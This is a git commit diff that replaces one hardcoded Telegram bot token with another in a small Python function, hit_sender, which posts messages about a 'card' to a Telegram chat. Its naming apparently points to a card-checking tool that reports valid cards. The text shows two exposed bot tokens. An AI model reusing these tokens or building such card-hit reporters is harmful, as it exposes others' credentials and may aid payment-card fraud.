159434fabeec14f61da4fd19bc202e1dc49650e6
drkhacker32 <138890195+drkhacker32@users.noreply.github.com>
2023-08-29 10:01:57 +0530

    Update extra.py

--- extra.py
+++ extra.py
@@ -1,7 +1,7 @@
 import requests
 
 def hit_sender(card,message,chat_id):
-    bot_token = '6116552527:AAHlR_23YAZ9DIKhcc3maLfLA4Dv65qapAg' #ganti sesuai selera
+    bot_token = '6501623476:AAHQMeqbE18Fky2c-ME_3D2blUMq8mKVj5U' #ganti sesuai selera
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
     data = {'chat_id': chat_id, 'text': message}
     requests.post(url, data=data)
